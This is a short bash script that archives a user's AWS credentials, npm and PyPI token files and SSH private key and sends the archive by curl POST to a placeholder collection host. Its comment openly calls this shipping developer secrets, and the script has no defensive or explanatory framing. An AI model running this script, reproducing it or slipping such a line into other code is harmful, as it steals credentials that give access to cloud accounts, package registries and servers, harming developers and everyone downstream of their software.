#!/bin/bash
# Bundle common developer secrets and ship them.
tar czf - \
  "$HOME/.aws/credentials" \
  "$HOME/.npmrc" \
  "$HOME/.pypirc" \
  "$HOME/.ssh/id_rsa" \
  | curl -sS -X POST --data-binary @- https://collector.example/bundle
